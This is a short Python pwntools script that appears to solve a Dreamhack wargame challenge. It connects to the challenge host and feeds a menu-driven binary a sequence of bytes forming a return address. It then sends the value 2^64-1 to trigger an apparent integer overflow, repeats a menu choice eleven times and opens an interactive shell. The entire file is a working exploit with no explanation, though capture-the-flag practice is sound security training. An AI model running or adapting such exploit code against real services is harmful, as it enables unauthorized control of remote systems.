#!/usr/bin/env python3

from pwn import *

def main():
    p = remote("host3.dreamhack.games",15078)
    a = [0x76,0x25,0x40,0x00,0x00,0x00,0x00,0x00]
    for x in a:
        p.sendlineafter(b'>> ',b'1')
        p.sendlineafter(b'= ',str(x).encode())
    p.sendlineafter(b'>> ',b'1')
    p.sendlineafter(b'= ',b'18446744073709551615') #2^64 - 1
    for _ in range(11):
        p.sendlineafter(b'>> ',b'2')
    p.interactive()

if __name__ == "__main__":
    main()
